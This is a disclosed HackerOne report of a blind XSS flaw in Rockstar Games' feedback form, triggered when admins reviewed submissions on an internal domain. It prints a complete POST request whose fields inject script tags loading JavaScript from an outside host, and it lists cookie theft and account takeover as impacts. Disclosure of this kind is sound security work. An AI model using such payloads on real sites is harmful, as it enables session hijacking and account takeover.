@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/197337
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/anshuman_bh
+ReportedTo:Rockstar Games(rockstargames)
+BountyAmount:650.0
+Severity:medium
+State:Closed
+DateOfDisclosure:17.03.2017 18:08:40
+
+Summary:
+@anshuman_bh discovered that it is possible to exploit a Blind XSS vulnerability under the "MOUTHOFF TO ROCKSTAR" section while providing feedback. The result is a XSS vulnerability being exploited on an internal Rockstar Games domain.
+
+The way this worked was that an attacker would submit a malicious XSS payload in an input field but cannot really see it being exploited anywhere unless the malicious payload gets triggered internally within Rockstar after an admin views the comments to approve/disapprove. There was no social engineering involved.
+
+The malicious payload was submitted at https://www.rockstargames.com/mouthoff/mouthoff/submit.json.
+
+The full POST request looked like:
+
+```
+POST /mouthoff/mouthoff/submit.json HTTP/1.1
+Host: www.rockstargames.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.rockstargames.com/newswire/article/60095/New-Pegassi-FCR-1000-Motorcycle-Vehicle-Vendetta-Mode-Plus-GTA-Online-
+Content-Length: 300
+Origin: http://www.rockstargames.com
+Cookie:<redacted>
+Connection: close
+
+_method=POST&name=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fabhartiya.xss.ht%3E%3C%2Fscript%3E&email=%40gmail.com&age=30&subject=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fabhartiya.xss.ht%3E%3C%2Fscript%3E&category_id=1&body=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fabhartiya.xss.ht%3E%3C%2Fscript%3E
+```
+Impact:
+
+* Since this is similar to Stored XSS, a malicious attacker could potentially steal the victim's session cookie and  completely takeover the account
+* This can allow attackers to view other people’s information such as their usernames, IP, comments as shown in the screenshot.
+* The CMS app looks like it is written in Angular JS because of the ng app field so, it may be possible to exploit a RCE vulnerability via angular injection
+* This allows information disclosure of internal domains/paths, admins, etc.
